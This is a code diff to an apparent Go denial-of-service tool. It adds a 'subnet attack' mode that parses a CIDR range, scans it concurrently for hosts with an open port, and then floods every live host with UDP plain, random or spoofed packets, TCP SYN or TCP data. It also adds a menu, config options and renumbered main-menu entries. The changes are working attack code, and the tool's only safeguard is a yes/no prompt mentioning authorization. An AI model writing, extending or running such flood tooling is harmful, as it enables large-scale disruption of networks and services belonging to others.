@@ -57,13 +57,15 @@ type AttackStats struct {
 
 // Config settings
 type Config struct {
-	ProxyList      []Proxy `json:"proxies"`
-	AttackTimeout  int     `json:"attack_timeout"`
-	ThreadCount    int     `json:"thread_count"`
-	PacketSize     int     `json:"packet_size"`
-	AutoRefresh    bool    `json:"auto_refresh"`
-	SaveLogs       bool    `json:"save_logs"`
-	BypassFirewall bool    `json:"bypass_firewall"`
+	ProxyList         []Proxy `json:"proxies"`
+	AttackTimeout     int     `json:"attack_timeout"`
+	ThreadCount       int     `json:"thread_count"`
+	PacketSize        int     `json:"packet_size"`
+	AutoRefresh       bool    `json:"auto_refresh"`
+	SaveLogs          bool    `json:"save_logs"`
+	BypassFirewall    bool    `json:"bypass_firewall"`
+	MaxSubnetThreads  int     `json:"max_subnet_threads"`
+	ScanTimeout       int     `json:"scan_timeout"`
 }
 
 // Global vars
@@ -207,12 +209,14 @@ func loadConfig(filename string) error {
 	if !Exists(filename) {
 		// Create default config
 		config = Config{
-			AttackTimeout:  60,
-			ThreadCount:    10,
-			PacketSize:     1024,
-			AutoRefresh:    true,
-			SaveLogs:       true,
-			BypassFirewall: false,
+			AttackTimeout:     60,
+			ThreadCount:       10,
+			PacketSize:        1024,
+			AutoRefresh:       true,
+			SaveLogs:          true,
+			BypassFirewall:    false,
+			MaxSubnetThreads:  20,
+			ScanTimeout:       1000,
 		}
 		return saveConfig(filename)
 	}
@@ -894,6 +898,212 @@ func multiTargetAttack(targets []string, port int, duration int, packetSize int)
 	addResult("Multi-target attack finished")
 }
 
+// ============ SUBNET ATTACK FUNCTIONS ============
+
+// ParseCIDR - Parse CIDR and return all IPs in range
+func ParseCIDR(cidr string) ([]string, error) {
+	_, ipnet, err := net.ParseCIDR(cidr)
+	if err != nil {
+		return nil, fmt.Errorf("invalid CIDR format: %v", err)
+	}
+	
+	var ips []string
+	ip := ipnet.IP.Mask(ipnet.Mask)
+	ones, bits := ipnet.Mask.Size()
+	
+	// Calculate total IPs in subnet
+	totalIPs := 1 << (bits - ones)
+	
+	// First IP is network address, last is broadcast
+	// Start from 1 and end at totalIPs-1
+	for i := 1; i < totalIPs-1; i++ {
+		nextIP := make(net.IP, len(ip))
+		copy(nextIP, ip)
+		
+		// Add i to the IP address
+		carry := i
+		for j := len(nextIP) - 1; j >= 0 && carry > 0; j-- {
+			sum := int(nextIP[j]) + carry
+			nextIP[j] = byte(sum % 256)
+			carry = sum / 256
+		}
+		
+		ips = append(ips, nextIP.String())
+	}
+	
+	return ips, nil
+}
+
+// CheckActiveHosts - Check which hosts are active in the subnet
+func CheckActiveHosts(ips []string, port int, timeout int) []string {
+	var activeHosts []string
+	var mutex sync.Mutex
+	var wg sync.WaitGroup
+	
+	info(fmt.Sprintf("🔍 Scanning %d hosts on port %d...", len(ips), port))
+	addResult(fmt.Sprintf("Scanning %d hosts on port %d", len(ips), port))
+	
+	semaphore := make(chan struct{}, 50) // Max 50 concurrent scans
+	var activeCount int32 = 0
+	
+	for _, ip := range ips {
+		wg.Add(1)
+		go func(ip string) {
+			defer wg.Done()
+			semaphore <- struct{}{}
+			defer func() { <-semaphore }()
+			
+			conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), 
+				time.Duration(timeout)*time.Millisecond)
+			if err == nil {
+				conn.Close()
+				mutex.Lock()
+				activeHosts = append(activeHosts, ip)
+				mutex.Unlock()
+				atomic.AddInt32(&activeCount, 1)
+				info(fmt.Sprintf("✅ Active host found: %s:%d", ip, port))
+			}
+		}(ip)
+	}
+	
+	wg.Wait()
+	success(fmt.Sprintf("✅ Found %d active hosts out of %d", 
+		atomic.LoadInt32(&activeCount), len(ips)))
+	addResult(fmt.Sprintf("Found %d active hosts", atomic.LoadInt32(&activeCount)))
+	return activeHosts
+}
+
+// SubnetAttack - Attack all hosts in a subnet
+func SubnetAttack(cidr string, port int, duration int, packetSize int, 
+	method string, maxThreads int) {
+	
+	info(fmt.Sprintf("🌐 Starting subnet attack on %s", cidr))
+	addResult(fmt.Sprintf("Subnet attack started: %s", cidr))
+	
+	// Parse subnet
+	ips, err := ParseCIDR(cidr)
+	if err != nil {
+		errorMsg(fmt.Sprintf("❌ Invalid CIDR: %v", err))
+		return
+	}
+	
+	info(fmt.Sprintf("📊 CIDR %s contains %d IPs", cidr, len(ips)))
+	
+	// Check active hosts
+	activeHosts := CheckActiveHosts(ips, port, config.ScanTimeout)
+	
+	if len(activeHosts) == 0 {
+		warning("⚠️ No active hosts found in the subnet")
+		addResult("No active hosts found in subnet")
+		return
+	}
+	
+	info(fmt.Sprintf("🎯 Starting attack on %d active hosts", len(activeHosts)))
+	addResult(fmt.Sprintf("Attacking %d active hosts in %s", len(activeHosts), cidr))
+	
+	// Start attack with thread control
+	var wg sync.WaitGroup
+	semaphore := make(chan struct{}, maxThreads)
+	var attackCount int64 = 0
+	
+	for _, targetIP := range activeHosts {
+		wg.Add(1)
+		go func(ip string) {
+			defer wg.Done()
+			semaphore <- struct{}{}
+			defer func() { <-semaphore }()
+			
+			info(fmt.Sprintf("⚔️ Attacking %s:%d", ip, port))
+			
+			// Select attack method
+			switch method {
+			case "udp":
+				udpPlainFlood(ip, port, duration, packetSize)
+			case "udp-random":
+				udpRandomFlood(ip, port, duration, packetSize)
+			case "udp-spoof":
+				udpSpoofFlood(ip, port, duration, packetSize)
+			case "tcp-syn":
+				tcpSynFloodSingle(ip, port, duration)
+			case "tcp-data":
+				tcpDataFloodSingle(ip, port, duration, packetSize)
+			default:
+				udpPlainFlood(ip, port, duration, packetSize)
+			}
+			
+			atomic.AddInt64(&attackCount, 1)
+			info(fmt.Sprintf("✅ Completed attack on %s (%d/%d)", 
+				ip, atomic.LoadInt64(&attackCount), len(activeHosts)))
+		}(targetIP)
+	}
+	
+	wg.Wait()
+	success(fmt.Sprintf("🎉 Subnet attack completed! Attacked %d hosts", 
+		atomic.LoadInt64(&attackCount)))
+	addResult(fmt.Sprintf("Subnet attack completed: %d hosts", 
+		atomic.LoadInt64(&attackCount)))
+}
+
+// SubnetAttackMenu - Subnet attack configuration menu
+func SubnetAttackMenu() {
+	printColor(colorPurple, "\n🌐 SUBNET ATTACK CONFIGURATION\n")
+	printColor(colorYellow, "================================\n")
+	
+	printColor(colorCyan, "Enter CIDR (e.g., 192.168.1.0/24): ")
+	var cidr string
+	fmt.Scanln(&cidr)
+	
+	// Validate CIDR
+	_, _, err := net.ParseCIDR(cidr)
+	if err != nil {
+		errorMsg(fmt.Sprintf("❌ Invalid CIDR format: %v", err))
+		return
+	}
+	
+	info(fmt.Sprintf("✅ Valid CIDR: %s", cidr))
+	
+	port := validateInt("📌 Port to scan/attack (1-65535): ", 1, 65535)
+	duration := int(validateFloat("⏱️ Attack duration per host (seconds): ", 1))
+	packetSize := validateInt("📦 Packet size (bytes, 1-65500): ", 1, 65500)
+	maxThreads := validateInt("🧵 Max concurrent attacks (1-50): ", 1, 50)
+	
+	printColor(colorYellow, "\n⚔️ Attack Method:\n")
+	printColor(colorYellow, "1. UDP Plain\n")
+	printColor(colorYellow, "2. UDP Random\n")
+	printColor(colorYellow, "3. UDP Spoof\n")
+	printColor(colorYellow, "4. TCP SYN\n")
+	printColor(colorYellow, "5. TCP Data\n")
+	
+	methodChoice := validateInt("Select method (1-5): ", 1, 5)
+	
+	methodMap := map[int]string{
+		1: "udp",
+		2: "udp-random",
+		3: "udp-spoof",
+		4: "tcp-syn",
+		5: "tcp-data",
+	}
+	
+	method := methodMap[methodChoice]
+	
+	// Confirmation
+	printColor(colorRed, "\n⚠️  WARNING: You are about to attack a whole subnet!\n")
+	printColor(colorYellow, "This will attack ALL active hosts in the subnet.\n")
+	printColor(colorRed, "Only continue if you have proper authorization.\n\n")
+	printColor(colorYellow, "Do you want to continue? (yes/no): ")
+	var confirm string
+	fmt.Scanln(&confirm)
+	
+	if strings.ToLower(confirm) != "yes" && strings.ToLower(confirm) != "y" {
+		info("❌ Subnet attack cancelled.")
+		addResult("Subnet attack cancelled by user")
+		return
+	}
+	
+	info("🚀 Starting subnet attack...")
+	SubnetAttack(cidr, port, duration, packetSize, method, maxThreads)
+}
+
 // ============ ETHICAL GUIDELINES ============
 
 func showEthicalGuidelines() {
@@ -1253,9 +1463,11 @@ func configureSettings() {
 	printColor(colorYellow, fmt.Sprintf("1. Thread Count (current: %d)\n", config.ThreadCount))
 	printColor(colorYellow, fmt.Sprintf("2. Auto Refresh (current: %t)\n", config.AutoRefresh))
 	printColor(colorYellow, fmt.Sprintf("3. Save Logs (current: %t)\n", config.SaveLogs))
-	printColor(colorYellow, "4. Reset to Default\n")
+	printColor(colorYellow, fmt.Sprintf("4. Max Subnet Threads (current: %d)\n", config.MaxSubnetThreads))
+	printColor(colorYellow, fmt.Sprintf("5. Scan Timeout (current: %dms)\n", config.ScanTimeout))
+	printColor(colorYellow, "6. Reset to Default\n")
 
-	choice := validateInt("Choice (1-4): ", 1, 4)
+	choice := validateInt("Choice (1-6): ", 1, 6)
 
 	switch choice {
 	case 1:
@@ -1275,13 +1487,27 @@ func configureSettings() {
 		success(fmt.Sprintf("Save Logs: %t", config.SaveLogs))
 		
 	case 4:
+		newMaxThreads := validateInt("New max subnet threads (1-100): ", 1, 100)
+		config.MaxSubnetThreads = newMaxThreads
+		saveConfig("config.json")
+		success(fmt.Sprintf("Max subnet threads updated: %d", newMaxThreads))
+		
+	case 5:
+		newTimeout := validateInt("New scan timeout in ms (500-5000): ", 500, 5000)
+		config.ScanTimeout = newTimeout
+		saveConfig("config.json")
+		success(fmt.Sprintf("Scan timeout updated: %dms", newTimeout))
+		
+	case 6:
 		config = Config{
-			AttackTimeout:  60,
-			ThreadCount:    10,
-			PacketSize:     1024,
-			AutoRefresh:    true,
-			SaveLogs:       true,
-			BypassFirewall: false,
+			AttackTimeout:     60,
+			ThreadCount:       10,
+			PacketSize:        1024,
+			AutoRefresh:       true,
+			SaveLogs:          true,
+			BypassFirewall:    false,
+			MaxSubnetThreads:  20,
+			ScanTimeout:       1000,
 		}
 		saveConfig("config.json")
 		success("Default config restored")
@@ -1330,36 +1556,39 @@ func main() {
 	// Main loop
 	for {
 		printColor(colorYellow, "\n📋 Main Menu:\n")
-		printColor(colorYellow, "1. 🚀 Start Attack (Authorized Testing)\n")
-		printColor(colorYellow, "2. 🔧 Configure Proxy\n")
-		printColor(colorYellow, "3. 📊 View Statistics\n")
-		printColor(colorYellow, "4. 💾 Save Results\n")
-		printColor(colorYellow, "5. 🛠️ Advanced Features\n")
-		printColor(colorYellow, "6. 🧹 Validate Proxies\n")
-		printColor(colorYellow, "7. ⚙️ Config Settings\n")
-		printColor(colorYellow, "8. 📋 Show Authorization Guidelines\n")
-		printColor(colorYellow, "9. 🚪 Exit\n")
+		printColor(colorYellow, "1. 🚀 Start Attack (Single Target)\n")
+		printColor(colorYellow, "2. 🌐 Subnet Attack (New!)\n")
+		printColor(colorYellow, "3. 🔧 Configure Proxy\n")
+		printColor(colorYellow, "4. 📊 View Statistics\n")
+		printColor(colorYellow, "5. 💾 Save Results\n")
+		printColor(colorYellow, "6. 🛠️ Advanced Features\n")
+		printColor(colorYellow, "7. 🧹 Validate Proxies\n")
+		printColor(colorYellow, "8. ⚙️ Config Settings\n")
+		printColor(colorYellow, "9. 📋 Show Authorization Guidelines\n")
+		printColor(colorYellow, "10. 🚪 Exit\n")
 
-		choice := validateInt("Your choice (1-9): ", 1, 9)
+		choice := validateInt("Your choice (1-10): ", 1, 10)
 
 		switch choice {
 		case 1:
 			startAttack()
 		case 2:
-			configureProxy()
+			SubnetAttackMenu()
 		case 3:
-			showStats()
+			configureProxy()
 		case 4:
-			saveResults("attack_results.txt")
+			showStats()
 		case 5:
-			advancedFeatures()
+			saveResults("attack_results.txt")
 		case 6:
-			validateAllProxies()
+			advancedFeatures()
 		case 7:
-			configureSettings()
+			validateAllProxies()
 		case 8:
-			showEthicalGuidelines()
+			configureSettings()
 		case 9:
+			showEthicalGuidelines()
+		case 10:
 			printColor(colorGreen, "Exiting program...\n")
 			return
 		}
